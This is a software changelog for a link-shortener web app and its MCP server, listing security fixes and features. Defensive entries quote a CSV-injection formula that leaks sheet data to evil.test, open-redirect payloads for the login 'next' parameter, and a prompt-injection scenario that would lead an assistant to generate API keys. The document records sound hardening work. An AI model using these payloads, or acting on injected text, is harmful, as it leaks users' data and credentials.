- **`PUT /api/v1/auth/me/avatar`** takes the image as the request body: a JPEG, PNG or WebP by its magic
  bytes, whatever the Content-Type says.
  - It's refused past 2 MB as it streams in (413), and past 4096 pixels a side before its pixels are
    loaded (413). Anything else is a 415.
  - It's stored re-encoded as a 512×512 WebP, turned by its EXIF orientation and cropped to its centre.
  - **No metadata is kept:** no EXIF (so no GPS or camera), XMP or ICC profile.
  - `profile.avatar_version` (on `/auth/me` and the profile endpoints) changes with each upload.
- **`GET /api/v1/auth/me/avatar`** answers the WebP, and 404 without one.
  - The `?v=<avatar_version>` URL of the current version is immutable in the browser's cache. Any other,
    the bare one included, is `private, no-cache` and revalidated against the ETag (304).
  - With `X-Content-Type-Options: nosniff`.
- **`DELETE /api/v1/auth/me/avatar`** removes it.
- None of these is an MCP tool.
- **Pillow is a new dependency** (a floor at 11.3). It parses untrusted input here, so it's held to the
  decoder the magic bytes name, `MAX_IMAGE_PIXELS` is set explicitly, and a decompression bomb is refused
  with a 413. Keep it up to date.
- **Migration 0009** adds the avatar's columns to `user_profiles`: new nullable columns only. The image
  column is deferred, so reading or saving the profile never loads it.

### Added — exporting and reviewing Shlink's links (Phase 8.4)
- **`python -m server.tools.shlink export`** reads Shlink's REST API into one raw JSON snapshot. It holds every
  short URL as Shlink returned it, its redirect rules, and with `--visits` every visit. It's read-only, and the
  API key (`SHLINK_API_KEY`) is only ever sent in its header: never written to the file or printed.
- **The snapshot can hold personal data** (visits' user agents, referers and locations). It's written readable by
  its owner only, into `_exchange/` by default. `*.snapshot.json` and `*.review.csv` are git-ignored.
- **`… review <snapshot>`** writes a CSV to decide `keep`, `archive` or `drop` for each link, `keep` by default.
  It flags duplicates, codes that differ only in case, expired or capped links, and redirect-rule conditions
  Shurly has no equivalent for. Every cell is spreadsheet-safe.
  - `capped` is Shlink's rule, every visit. `capped_in_shurly` is Shurly's, clicks only: whether the link
    arrives capped from an import with `--visits`. A link with the first and not the second reopens.
- **`--check-destinations`** fills in each destination's HTTP status. It goes through the link previews' SSRF
  guard, now also exposed as `guarded_request` (`HEAD` as well as `GET`): public http(s) addresses only, each
  redirect hop checked, 8 at a time.
- `server/tools/shlink/README.md` documents both. The import comes next.

### Added — a profile: name, country and time zone (Phase 3.12)
- **Settings → Account → Profile** has first name, last name, country and time zone, saved together.
  - The time zone list follows the country, and a country with one zone picks it.
  - Without a saved time zone, this browser's is picked, for the person to save.
  - Labels show the current offset, e.g. "Atlantic/Canary (GMT+1)".
- **The header's initial comes from the first name**, and from the email without one.
- **`GET /api/v1/auth/me` returns `profile`**: `first_name`, `last_name`, `country` and `timezone`,
  each null until set. Nothing else in the response changed.
- **`PATCH /api/v1/auth/me/profile`** changes the fields it's sent; null, or a blank name, clears one.
  - Names are trimmed, 100 characters at most, one line.
  - `country` is an ISO 3166-1 alpha-2 code.
  - `timezone` is an IANA name, never an offset. A legacy one is stored as the current one:
    `Asia/Calcutta`, which Chrome still reports in India, becomes `Asia/Kolkata`.
  - The MCP has it too, as `update_my_profile`.
- **Signing in with Google starts the profile** with the names in the ID token, for an account that has
  no profile yet. After that the profile is the person's: Google never changes it, not even names they
  cleared. The web sign-in now asks Google for the `profile` scope; the MCP's sign-in doesn't.
- **Time zones and countries are checked against the `tzdata` package, a new dependency**, not the
  server's own database. The production image's has 486 zones and none of the legacy names.
  - The picker's lists (`frontend/src/data/timezones.json`) come from the same package, through
    `scripts/generate_timezones.py`.
  - A test fails when they drift apart.
- **Migration 0008** adds the `user_profiles` table. A row is made on the first save.

### Changed — `users.api_key` is no longer mapped, ahead of its drop (Phase 6.3)
- The plaintext column, empty since `0007`, stayed mapped as `_legacy_api_key`, so the ORM still named it in every
  SELECT and INSERT of a user. Dropping it in the next release would have failed every user query on the task still
  running this one, mid-rollout: signing in, every authenticated call, the MCP.
- This release doesn't map it. A PostgreSQL test drops the column by hand and runs this release against the result:
  signing in, generating an API key, `/me`, an MCP tool call with the key, revoking.
- The release after drops it, in migration `0014` (0009 is the avatar, 3.12; 0010 repairs `last_click_at`; 0011 is a visit's city, 8.4; 0012 is the organization's logo, 3.14.4; 0013 is longer short codes, 8.4). Until then the migration drift test ignores exactly that column
  and its index, and a guard fails once they're gone.

### Security — the client IP behind CloudFront (Phase 6.3)
- **Behind CloudFront, the client IP is the viewer's, not the edge's.** Once `shurly.griddo.io` goes through the
  distribution (4.10), the ALB's peer is a CloudFront edge, and every per-IP rate limit would have counted
  everyone behind the same edge as one. The app now takes the address from `CloudFront-Viewer-Address`.
- **But only from a request that proves it came through the distribution:** one carrying a secret that the
  distribution adds as a custom origin header (`CLOUDFRONT_ORIGIN_SECRETS`, compared in constant time; two values
  while it rotates, each at least 32 characters). The ALB is shared and reachable directly, and anyone can send
  `CloudFront-Viewer-Address`, but not the secret. Without the secret, or when the header is missing or doesn't
  parse, the address comes from `X-Forwarded-For` as before. It's off until the secret is set.
- **And only when it's the address CloudFront appended to `X-Forwarded-For`**, second from the right, before the
  edge the ALB appends; compared in canonical form, so an IPv6 address written two ways still matches. That holds
  if the origin request policy is wrong, or the ALB stops appending: either way the address comes from
  `X-Forwarded-For`.
- **One `client_ip`** (`server/utils/network.py`) decides the address for the rate limits and the visit log.
- The secrets print as `**********` in the settings, and are never logged.
- `DEPLOYMENT.md` § Frontend hosting sets up the distribution for this. Its API behaviours now use the origin
  request policy that adds CloudFront's headers (AllViewerAndCloudFrontHeaders-2022-06, not AllViewer). The ALB rule
  that refuses `shurly.griddo.io` without the secret is documented as optional defence in depth, per host.

### Fixed — orphan visits store the client's address, anonymized, like visits
- A visit to the bare short-link host (`/`) stored the socket's address: the ALB's in production, or the full,
  unanonymized address without a proxy. An unknown short code with `ANONYMIZE_REMOTE_ADDR=false` stored the ALB's
  address too. Both now store what a visit stores (`visit_ip`): the client IP, resolved first and then anonymized.

### Security — the deploy masks the container's credentials again
- **`deploy-backend.yml` reads the container from `service.activeConfigurations[0]`**: it read
  `service.primaryContainer`, which is null for Express services, so the step that masks
  credential-looking values (`DB_PASSWORD`, `*SECRET*`, `*KEY*`…) in the logs masked nothing. No value
  was printed (the update's response goes to /dev/null), but the defence wasn't there. It takes the
  newest active configuration (a rollout has two, in no promised order, and the old one would put
  previous settings back), and stops if it finds no image and environment.

### Removed — `CI_CD_SETUP.md`, the Lambda-era deploy guide
- It described access keys, SAM and API Gateway. The deploys it covered are in DEPLOYMENT.md:
  § CI/CD with OIDC (the backend, to ECS) and § Frontend hosting (the frontend, to S3 + CloudFront).
  Nothing linked to it.
- **DEPLOYMENT.md § Workflow trigger** said the backend deploy ran only by hand. It runs on every push
  to `main`, and by hand for a rollback.

### Security — SQL built only from bound parameters, checked (Phase 6.3)
- **Audited:** the API reaches the database through the ORM and SQLAlchemy Core, which bind every
  value. The raw SQL left is static (`SELECT 1`) or takes `:name` parameters (the migration lock).
  Migrations format only constant table names.
- **Fixed: `%` and `_` in a tag search are characters now, not LIKE wildcards.** `GET /api/v1/tags?search=_`
  returned every tag. The links search already escaped them.
- **`tests/test_sql_safety.py`** parses the backend (`server/`, `mcp_server/`, `main.py`) and fails on:
  - `text()`, `exec_driver_sql()` or `literal_column()` given anything but a string literal;
  - a LIKE helper on a column fed a variable without `autoescape=True`.
  Exceptions need an allowlist entry with a reason; the list starts empty.

### Security — no API keys, passwords or session tokens through the MCP (Phase 6.3)
- **The `generate_api_key` and `revoke_api_key` tools are gone.** An assistant reads
  untrusted text, such as link titles and fetched pages, which could talk it into "generate a
  new API key". The new key would then land in its context, the leak that taking the key out of
  `/auth/me` closed, and the key the person uses would stop working. Like changing the
  organization or the password, this is left to the person: Settings → API & MCP, or
  `POST /api/v1/auth/api-key/generate` and `DELETE /api/v1/auth/api-key`, which are unchanged.
- **So are `login` and `change_password`.** `login` put a JWT in the assistant's context, and
  both took a password from it. The MCP is already signed in, so neither did anything there that
  the person needs. `POST /api/v1/auth/login` and `POST /api/v1/auth/change-password` are
  unchanged.
- The MCP now has 39 tools (35 generated from the API, 4 curated).

### Security — a Content-Security-Policy on every page (Phase 6.3)
- **Every built page carries a Content-Security-Policy**, a `<meta>` written by Astro with the hashes of
  the scripts it emits.
  - Scripts run only from this site or by hash: no `'unsafe-inline'`, no `'unsafe-eval'`.
  - The few inline scripts (the sign-in redirects, and Settings opening the tab its address names) live in
    `frontend/src/inline-scripts.mjs`, and their hashes come from the same strings.
  - Style attributes set from data are the only inline styles allowed (`style-src-attr`).
  - Images may come from any https site (link previews); API calls go to the API's origin only.
- **The sign-in redirects moved to the top of `<body>`.** A `<meta>` policy only governs what follows it,
  and Astro writes it at the end of `<head>`. They still run before anything paints.
- **`npm run build` fails on a page the policy doesn't cover:** no policy, a script or preload before it, an
  inline script or `<style>` without its hash, an inline event handler, or a `javascript:` URL.
- The user manual says an API key is shown only once, when it's generated, and what to do if it's lost.

### Security — API keys are stored as a hash and shown once (Phase 6.3)
- **The database no longer holds API keys.** It keeps each key's SHA-256 hash and first
  12 characters (`users.api_key_hash`, `users.api_key_prefix`). Migration `0007` moves every
  existing key there and empties `users.api_key`, which a later release drops. Keys made before
  keep working. A key is looked up by its hash, through a unique index, so the key itself is never
  compared.
- **`GET /api/v1/auth/me` no longer returns `api_key`.** It returns `has_api_key` and
  `api_key_prefix` instead. This breaks the versioning policy above, on purpose: the key can't be
  returned once only its hash is kept. The only client that read the field, Settings → API & MCP,
  changes in the same release. `/auth/me` is also the MCP's `get_current_user_info` tool, which
  used to put the key in an assistant's context whenever it asked who you are.
- **The key is shown once, by `POST /api/v1/auth/api-key/generate`.** Settings says "copy it now:
  it won't be shown again". Later it shows how the key starts, and Regenerate. "Copy with my
  key" is there right after you generate a key; otherwise the command keeps `<your API key>`.
- **New keys start with `shurly_`**, so people and secret scanners can recognise a leaked one. A
  token with two dots is still a JWT, whatever it starts with.
- While `0007` rolls out, the task still on the previous release answers 401 to API keys
  (`DEPLOYMENT.md` § API keys).

### Changed — the frontend deploy, ready for S3 + CloudFront (Phase 4.10)
- **`deploy-frontend.yml` rewritten for the chosen setup:**
  - OIDC with its own least-privilege role (`AWS_FRONTEND_DEPLOY_ROLE_ARN`), no access keys.
  - The production values: `PUBLIC_API_URL=https://shurly.griddo.io`, `PUBLIC_SHORT_DOMAIN=s.griddo.io`.
  - Tests and the build before any upload.
  - Only the hashed `_astro/` files are cached for good. Pages, favicons, `og-image.png` and the manifest
    revalidate, where before every non-HTML file was cached for a year.
  - A CloudFront invalidation after each deploy.
  - It runs on merges to `main` that touch the frontend, and while `FRONTEND_BUCKET` is unset it says
    it skipped instead of failing.
- **CI builds the frontend:** `npm ci`, `npm test` and `npm run build` (astro check) on every PR.
- **A CloudFront Function** (`infra/cloudfront/static-paths.js`, with tests) gives a private bucket its
  directory indexes and adds the missing trailing slash, and it can't redirect off the site.
- **DEPLOYMENT.md § Frontend hosting** covers the distribution's behaviours for the app, the API and the MCP,
  the us-east-1 certificate, the bucket, the deploy role's policies, cutover and rollback, and two open
  decisions: error pages, and client IPs behind CloudFront.

### Fixed — a long value from outside a schema no longer fails with a 500
- **A link to a page with a long title is created.** The title fetched for the preview
  went into `og_title` (255 characters) as it was, and PostgreSQL refused a longer one:
  a 500 on creating the link, on refreshing its preview, or on the live preview's
  suggestion. Fetched titles are cut to the column now.
- **A redirect with a long `X-Forwarded-For` redirects.** Behind a trusted proxy, the
  address stored with a visit or an orphan visit came from that header, and a value
  longer than the column (50) was a 500 on the redirect itself. Addresses are cut to
  their column (`fit`, `server/utils/columns.py`).
- **The MCP's `create_campaign_from_rows` refuses a name over 255 characters**, as the
  API does; it writes through the ORM, past the API's schema, and a longer name was a
  500. A test pins every request field stored in a bounded column to a `max_length`
  within that column, so the gap can't come back unnoticed.

### Changed — CORS allows only what the frontend uses
- **No credentials**, and only the methods (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`) and
  request headers (`Authorization`, `Content-Type`, `X-Request-Id`) the API uses, instead
  of `*`: the frontend sends a bearer token, never cookies. It can now read
  `Retry-After` and `X-Request-Id` from a response. Origins are unchanged.
- In production the frontend and the API will share an origin (`shurly.griddo.io`, once
  the frontend is hosted, 4.10), so `CORS_ORIGINS` needs no entry there; the defaults
  are for the dev server (`localhost:4232`).

### Added — the user manual, starting with how to connect Claude (Phase 5.9)
- **`/manual/`**: Markdown in `frontend/src/content/manual/` (an Astro content collection),
  rendered at build time. Its first page, "Connect Claude to Shurly", covers Claude Code and
  claude.ai / Claude Desktop: signing in with Google first, an API key as the route that works on
  its own, and what to do when something goes wrong.
- **Settings → API & MCP shows the same page**, so the app and the manual can't drift, with
  "Copy with my key": it builds the API key command when clicked, from the key the page already
  holds, and never writes the key into the page, a URL or storage.
- **The MCP address comes from `PUBLIC_MCP_URL`** at build time, or the API's `/mcp/`, always
  with the trailing slash people must use.
- **Fixed:** the API key panel wrote the full key into its Copy buttons' `data-copy` attributes
  when the page loaded, behind the masked display. The buttons now copy from memory when
  clicked.

### Changed — Shurly's public host is `shurly.griddo.io`
- **`shurly.griddo.io` serves the web, the app, the API and the MCP** (decided 2026-09-28):
  `MCP_PUBLIC_URL=https://shurly.griddo.io/mcp`, the Google redirect URIs
  `https://shurly.griddo.io/api/v1/auth/google/callback` and `…/mcp/auth/callback`, and
  `FRONTEND_URL=https://shurly.griddo.io`. It's a second host on ALB rule 12, so the rule sync needs
  no change. The deploy's smoke test checks it. `go.griddo.io` is for short links only (Phase 8);
  `s.griddo.io` stays for tests until then and is deleted at the cutover.
- `mcp_server/README.md`: `claude mcp add` takes the URL as a positional argument, not `--url`.

### Security — rate limits on the login and the sign-in endpoints (Phase 6.3)
- **What anyone can call is limited per client IP**, counted in the database so both
  tasks share the counts (the new `rate_limits` table, migration `0006`): the password
  login, whose every attempt runs a bcrypt check on the tasks that also serve
  redirects, and the Google and MCP sign-in endpoints, each of which writes a row.
  `/mcp/register` and `/mcp/token` get their own, generous count, since claude.ai calls
  them from Anthropic's addresses. Redirects, anything signed in and CORS preflights
  aren't limited.
- **Failed password logins are also limited per address** (10 per 15 minutes by
  default), wherever they come from. Only failures count, so the right password isn't
  counted with a guesser's. Anyone can lock an address's password login for the window,
  but signing in with Google stays open, and an address without an account locks the
  same way, so a 429 tells nothing about who has one.
- Over a limit: `429` with `Retry-After`. Google's sign-in goes back to the login page
  with `#error=rate_limited`, which the frontend now explains. The event log records
  `http.rate_limited {path, limit}`, without the IP or the address. If the database
  can't count, requests go through and `rate_limit.store_failed` is logged.
- New settings: `RATE_LIMIT_LOGIN_PER_IP`, `RATE_LIMIT_LOGIN_FAILURES_PER_ACCOUNT`,
  `RATE_LIMIT_SIGN_IN_PER_IP`, `RATE_LIMIT_MCP_CLIENTS_PER_IP` (0 turns one off).
  They key on the client IP, so `TRUSTED_PROXIES` must name the ALB.

### Security — a client can't choose the IP it's recorded under
- **`X-Forwarded-For` is read from the right**, skipping the proxies in
  `TRUSTED_PROXIES`. The ALB appends the address it saw to whatever the client sent,
  and the resolver took the leftmost entry, the client's own claim: anyone could choose
  the address a visit was recorded under, and would have reset a per-IP rate limit
  with every request.

### Security — CSV exports can't carry spreadsheet formulas
- **The campaign export and the campaign recipients CSV neutralize cells that start
  like a formula** (`=`, `+`, `-`, `@`, a tab or a carriage return) with a leading
  single quote, which spreadsheets show as text (OWASP "CSV Injection"). Recipient data
  comes from uploaded CSVs, so a recipient named `=HYPERLINK("https://evil.test/?"&A1,…)`
  would have become a live formula for whoever opened the export, able to send the
  sheet's contents elsewhere. Column names too, and the other analytics CSVs go through
  the same writer (`spreadsheet_safe`, `server/utils/csv_export.py`).
- **An export uploaded back as a campaign keeps its data:** the CSV import drops that
  quote again. A phone number like `+34 600…` also gets the quote in an export; that's
  the usual trade-off.
- **Any campaign name exports.** The download's filename came from the campaign's name
  as it was: a name outside latin-1 (`Q4 🚀`, `东京`) made the export fail with a 500,
  and quotes, CR/LF or slashes went into the `Content-Disposition` header. Every CSV now
  sends a plain ASCII `filename` and the real name in `filename*` (RFC 6266/5987,
  `content_disposition`), which browsers prefer. The response isn't cached
  (`Cache-Control: no-store`), like the other CSVs.

### Security — the frontend's markup, audited (Phase 6.3)
- **Every raw `innerHTML` that carried data now goes through the escaping `html` tag and
  `setHTML`**: toasts, confirm dialogs, form alerts, the tag picker, charts and their
  tooltips, the link page and the new-link preview. They were escaped by hand before; nothing
  exploitable was found. Two raw sinks remain, each explained in the code and the test:
  `setHTML` itself, and the QR code (numbers and fixed colours only).
- **Links and images from data go through `safeUrl`** (http and https only, anything else is
  `#`), now also the short link after creating one and the tracking pixel's snippet. A
  `javascript:` destination, OG image or redirect target stays inert even in rows the API's
  own checks never saw.
- **A tag colour must be a hex colour to reach a `style` attribute**, so a stored value can't
  add CSS (`#fff;background:…`).
- **Regression tests** (`cd frontend && npm test`, in CI): a scan of `frontend/src` fails on
  any new raw HTML sink, `raw()` on data, or `href`/`src` built from a URL without
  `safeUrl`; unit tests pin the escaping and `safeUrl` against `javascript:`, `data:` and
  obfuscated schemes.
- A copy button clicked twice within two seconds no longer stays on "Copied!", and a loading
  button gets its own content back (nodes, not re-parsed markup).

### Added — MCP clients sign in with Google (Phase 5.8)
- **The MCP takes Google sign-ins as well as API keys and JWTs**, so Shurly can be
  added as a claude.ai custom connector, whose only way to authenticate is OAuth.
  Existing setups with `--header "Authorization: Bearer <api key>"` don't change.
  fastmcp's OAuth proxy runs the flow: client registration (DCR and Client ID
  Metadata Documents), a consent page, then Google. Its endpoints are under `/mcp/`,
  and the discovery documents (RFC 9728, RFC 8414) are at `/.well-known/…/mcp` at the
  root. A request without a token now gets a 401 pointing at them.
- **The same account, by the same rules, as on the web.** Google's ID token is
  checked like the web's, and the account comes from the web sign-in's rules: the
  organization's Workspace only, a verified address, the domain gate and
  membership, `account_conflict`, and the pre-hijack lockout. A refused sign-in gets
  no token (`invalid_grant`). Closing an account in Shurly refuses its MCP sign-ins
  at once, requests and refreshes alike; a suspension at Google takes up to a minute
  (a successful check with Google is kept 60 seconds).
- **Survives two tasks and every deploy.** What the proxy keeps (registrations,
  sign-ins in progress, codes, Google's tokens) lives in the new `mcp_oauth_store`
  table (migration `0005`), encrypted; its tokens are signed with a key of its own,
  never the Google client secret.
- **Only the clients we target can register:** claude.ai's (and claude.com's)
  callback and loopback on any port for Claude Code. Any other app is refused, so it
  can't ask a Griddo person to consent (consent phishing).
- **New settings:** `MCP_PUBLIC_URL`, `MCP_OAUTH_SIGNING_KEY` and
  `MCP_OAUTH_ALLOWED_REDIRECT_URIS`. Until the first two are set, with the Google
  client, the MCP works as before. The Google client needs the extra redirect URI
  `{MCP_PUBLIC_URL}/auth/callback`. DEPLOYMENT.md § The MCP.

### Added — Removed people, in Settings → Organization (Phase 3.14.3)
- **Owners can move someone's personal links later, not only right after removing them.**
  `GET /api/v1/organization/removed-members` lists the people removed from the organization
  (closed accounts on its email domain; one off the domain was never in it, so its address
  isn't shown), with how many personal links (a campaign's included) and campaigns each still
  owns: what `adopt-personal-links` would move. Most first, then by email. Owners only (403
  otherwise), and kept out of the MCP like the move itself.
- Settings → Organization shows them to owners under Members, each with "Move to …", or
  "Nothing left to move". The section is left out when nobody was removed.
- The organization's copy says "signs in" instead of "signs up": accounts come from signing in
  with Google since 3.13.

### Security — after logging in, `?next=` can't send you to another site
- **The login page's `next` is resolved the way the browser resolves it**, not judged by its
  first characters. Browsers drop tabs and line breaks from URLs, so
  `/login/?next=/%09/evil.com` passed the old check and sent someone to `evil.com` right after
  logging in; dot segments (`/.//evil.com`) did the same. Control characters and backslashes are
  refused outright, and the path that comes out must still start with a single `/` on this site.
  The same check covers the path kept across the Google round trip. Covered by the frontend's
  first unit tests (`cd frontend && npm test`, on Node's WHATWG URL parser), now a CI job.
- **The login and password forms `POST` if they're submitted before their script loads**, so the
  password can't end up in the address bar, the history or the host's logs.

### Added — Google sign-in in the frontend (Phase 3.13.5)
- **"Sign in with Google" on the login page.** It leaves for
  `GET /api/v1/auth/google/start`; Google's answer comes back as `/login/#code=…`, which
  the page trades by `POST /api/v1/auth/google/exchange` for the session, so the token
  never travels in a URL, and the fragment is cleared right away. `#error=…` codes get
  plain-language messages. Where you were going survives the round trip (kept in
  `sessionStorage`, same-site paths only). Email and password login stays, and "Forgot
  password?" now says to sign in with Google and set a new one.
- **No sign-up page**: accounts are created by signing in with Google. `/register/`
  redirects to the login page, and the landing page's "Get started" buttons lead there.
- **Settings → Account → Password**: set, change or remove a password. Replacing one
  takes the current password; with Google it's optional, and without it the change
  needs a recent sign-in, the way back from a forgotten one. Without Google the password
  is the only way in, so removing it is locked with the reason. When the session is too
  old for the change, a button signs you in with Google again and brings you back to
  Settings.

### Security — a refused login no longer tells whether the address has an account
- **`POST /api/v1/auth/login` takes as long for an unknown address, or an account without a
  password, as for a wrong password.** It returned before checking any password, so the response
  time showed which addresses have an account. It now runs a dummy bcrypt check on those paths
  (passlib's `dummy_verify`).

### Added — sign in with Google (Phase 3.13.2)
- **People at Griddo sign in with their Google Workspace account.** `GET /api/v1/auth/google/start`
  sends the browser to Google (OpenID Connect, authorization code with PKCE), and
  `GET /api/v1/auth/google/callback` checks the result and sends the browser to
  `{FRONTEND_URL}/login/#code=…`. The page trades that one-time code for the usual JWT at
  `POST /api/v1/auth/google/exchange`, so the JWT never travels in a URL. The contract with the
  frontend is in the docstring of `server/app/google_auth.py`.
- **Only the organization's accounts get in.** The ID token is checked on the server: signature
  against Google's keys, audience, issuer and expiry (google-auth), a verified address, and an `hd`
  claim equal to `ORGANIZATION_DOMAIN`. The `hd` sent to Google is only a hint.
- **A sign-in can't be finished in another browser, or twice.** The `state` is stored hashed, works
  once, expires in 10 minutes and must match an HttpOnly cookie set by `/start`. The one-time code
  is stored hashed, works once and expires in 60 seconds.
- **An account is recognised by Google's `sub`**, in the new `user_identities` table (migration
  `0004`), so an address change on Google's side keeps the account. The first sign-in makes the
  account and joins the organization; the 3.14.2 domain gate still applies. An address whose
  account is linked to another Google account is refused (`account_conflict`), never linked.
- **An account made before Google is taken back from whoever made it.** The open sign-up never
  verified addresses, so when such an account first signs in with Google it's linked, but its
  password is cleared, its API key revoked and every existing session ended (account
  pre-hijacking). Logged as `auth.identity_linked`.
- **Event log:** `auth.login` `{method, user_id}` for every sign-in, with Google or a password, and
  `auth.google_refused` `{reason}`. Never an address, a token or a code.
- **New settings:** `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`, `GOOGLE_REDIRECT_URI` and
  `FRONTEND_URL`. Until they're set, the Google endpoints send the browser back with
  `#error=google_unavailable`, or answer `503` without `FRONTEND_URL`, and everything else works as
  before. DEPLOYMENT.md § Sign in with Google has the Google Cloud setup.

### Added — an optional password, set by the account's owner (Phase 3.13.3)
- **`PUT /api/v1/auth/password` sets or replaces the password; `DELETE` removes it.** Only from a
  signed-in session: an API key gets a `403`, so a leaked key can't become a password. Without the
  current password, the sign-in must be at most 10 minutes old, or it's a `403` with
  `{"code": "reauth_required", …}`: that's the way back from a forgotten password (sign in with
  Google, set a new one). Removing is refused (`409`) when the account doesn't sign in with Google.
  Logged as `auth.password_set` and `auth.password_removed`. Neither endpoint is an MCP tool.
- **`GET /api/v1/auth/me` says `has_password` and `has_google`**, for Settings → Account.
- **Sessions can be ended.** JWTs now carry `iat`, and an account's `sessions_valid_from` refuses
  the ones issued before it, in the API and the MCP alike. Tokens from before this release have no
  `iat` and keep working until their account gets a cutoff, so nobody is logged out.
- `users.password_hash` may be NULL (migration `0004`): an account made through Google has no
  password. `POST /auth/login` answers `401` for it, and `POST /auth/change-password` a `409` that
  points to `PUT /api/v1/auth/password`. During the rollout, the previous release answers `500` to a
  password login for an account whose password the new one has just cleared.

### Removed — sign-up with a password (Phase 3.13.2)
- **`POST /api/v1/auth/register` answers `404`** and is gone from the API docs and the MCP (the
  `register` tool), unless `ALLOW_PASSWORD_SIGNUP=true`, which is for local development and tests,
  never production. The app logs `auth.password_signup_enabled` at startup when it's on. Accounts
  come from signing in with Google. A deliberate break of the versioning policy above: anyone could
  make an account on a Griddo domain (retro R1).

### Added — move a removed person's personal links from Settings (Phase 3.14)
- **When an owner removes someone** in Settings → Organization, a follow-up asks whether
  to move that person's personal links and campaigns to the organization, so the team
  can manage them. Skipping is fine: the links keep redirecting either way. A toast says
  what moved, and a 403, 404 or 409 shows the API's message in the dialog. Admins, who
  can remove members but not move their links, aren't asked.

### Added — the organization in the frontend (Phase 3.14)
- **Settings → Organization**: the members, with their role and the date they joined.
  Each row offers only what your role allows (the table in 3.14.2): owners change
  roles, make other owners, hand the role over and remove people below them; admins
  remove members; anyone can step down except the last owner. Removing someone and
  handing the role over ask first, and so do making an owner and stepping down, which
  you can't undo yourself. The API's 403/409 message is shown as it comes, and the list
  reloads after a refusal. An account outside any organization gets a note instead.
- **A "Personal" switch on every create flow** (quick create, the full editor and the
  campaign wizard), off by default: new links and campaigns belong to the organization
  unless it's on. Its hint names who will see them.
- **Who created what**: link and campaign lists and pages say "Created by you" or the
  creator's email, and personal ones carry a "Personal" badge.
- **Locked controls**: editing, deleting, redirect rules and preview refreshes of an
  organization link or campaign you can't change (someone else's, when you're a
  member) are dimmed, say why on hover and explain on click. A 403 that still gets
  through is shown like any other error, and the page checks your role again. Bulk
  tagging says how many links it skipped.

### Changed — copy that assumed every link was yours
- A campaign's per-recipient links are "personalized links": "personal" now means only
  you can see it.
- The title hint says visitors never see it (it said "only you see this"), the links
  page describes the team's links, and a link or campaign that isn't found may be
  someone else's personal one.

### Fixed — campaign summary returned 500 on PostgreSQL
- **`GET /api/v1/analytics/campaigns/{id}/summary` failed for every campaign on PostgreSQL**
  ("could not identify an equality operator for type json"). Its top-performers query
  grouped by `urls.user_data`, a `json` column PostgreSQL can't GROUP BY; the SQLite test
  suite allows it, so it never showed. It now groups by `urls.id`, on which the other
  selected columns depend. Regression test against PostgreSQL:
  `tests/test_analytics_postgres.py`. Found in the 3.14 frontend's manual pass.

### Fixed — random test failure on UUIDs that look like numbers
- **The test suite no longer fails at random with `'float' object has no attribute
  'replace'`.** Its in-memory SQLite created the models' UUID columns as `UUID`, a
  type SQLite gives numeric affinity, so an id whose 32 hex digits read as a number
  (all digits, or digits around one `e`: about one uuid4 in 700,000) was stored as a
  float and failed to load. `tests/conftest.py` now creates them as `CHAR(32)` on
  SQLite. Test-only: PostgreSQL has a native UUID type, and the models are unchanged.

### Security — only accounts on the organization's email domain join it
- **A new account joins the organization only if its email is on `ORGANIZATION_DOMAIN`**
  (default `griddo.io`; exact, case-insensitive; empty lets anyone join). Sign-up is
  still open to anyone until Google sign-in (3.13), and since 3.14.3 every member sees
  all of the organization's links and campaigns, recipients' names and emails included.
  So anyone could register and read or export the team's campaigns. An account off the
  domain now keeps working with personal links only. The startup sync applies the same
  rule, and each refused join logs `org.join_refused` with the user id, not the email.

### Security — link previews log the destination's origin, not the URL
- **A failed link preview no longer writes the destination URL to the log.** The
  Open Graph fetcher logged the whole URL when a fetch was refused, timed out,
  got an error status or failed, and so did the preview endpoint's guard. A
  destination URL is user input, and its path or query string can carry personal
  data (`/in/jane-doe`, `?email=…`). Those warnings reach CloudWatch although
  nothing configures logging: the root logger has no handler, so Python's
  last-resort handler prints them to stderr. They now keep the URL's origin:
  scheme, host and port (`url_origin` in `server/utils/url.py`). An unexpected
  error logs its type, not its message, which can repeat the URL, and a refused
  non-http(s) redirect names its scheme instead of the whole URL.

### Added — links and campaigns belong to the organization (Phase 3.14.3)
- **Everyone in the organization sees its links and campaigns**, and their stats:
  per link, per campaign, the overview and the CSV exports. New links and
  campaigns are the organization's; send `"visibility": "personal"` when creating
  one that only you see. Link and campaign responses carry `visibility` and
  `created_by_email`.
- **Who changes what**: the creator, and for the organization's links and
  campaigns, admins and owners too. Anyone else who can see one gets a 403 when
  editing, tagging, refreshing the preview, adding redirect rules or deleting.
  Bulk tagging skips those links and lists them in `failed`.
- **Someone else's personal link or campaign doesn't exist for you** (404),
  whatever your role. Campaigns used to answer 403 here; they now match links.
- **`POST /api/v1/organization/adopt-personal-links`**: once someone has been
  removed, an owner moves their personal links and campaigns to the organization,
  so the team can still manage them. Logs `org.links_adopted`. Not an MCP tool,
  like the other organization changes.
- **MCP**: `create_campaign_from_rows` takes `visibility`; `add_redirect_rule`
  and `get_url_analytics_summary` follow the same rules. The generated tools
  already did, since they call the API.
- **Migration `0003`** adds `organization_id` to `urls` and `campaigns` (NULL
  means personal) and gives the organization everything made so far. It creates
  the organization when the app hasn't yet, as happens when `0002` and `0003`
  run in the same deploy.
- An account outside any organization only sees and makes personal links. None
  exist in production: sign-up and startup put every active account in it.

### Added — the organization, its members and their roles (Phase 3.14.2)
- **Every account belongs to one organization** ("Griddo", from
  `ORGANIZATION_NAME` / `ORGANIZATION_DOMAIN`), as owner, admin or member.
  Sign-up joins it as member; at startup, active accounts without a membership
  join too. Migration `0002` adds `organizations` and `organization_members`.
- **The first owner comes from `BOOTSTRAP_OWNER_EMAIL`**, not from whoever signs
  up first: that account joins as owner when the organization has none. If no
  active owner is left, startup makes it owner again (break-glass). Set it
  before the first sign-up, or nobody can change roles.
- **`/api/v1/organization`**: the organization and your role; `GET /members`;
  `PATCH /members/{user_id}` to change a role; `DELETE /members/{user_id}` to
  remove someone (their account is closed and its API key revoked; their links
  keep redirecting); `POST /transfer-ownership` to make someone owner and step
  down to admin.
- **The rules**: owners change the roles of admins and members, to any role, but
  never another owner's; admins change no roles and remove members; nobody
  removes or changes someone with a role equal to or above theirs; anyone may
  lower their own role, except the last owner (409). That check locks the owner
  rows, so two owners stepping down at once leave one (tested on PostgreSQL).
- **Every change is logged**: `org.role_changed` and `org.member_removed` lines
  in the event log, with who did it.
- **MCP**: `get_organization` and `list_organization_members` are tools; role
  changes, removals and handovers are not, so an assistant reading untrusted
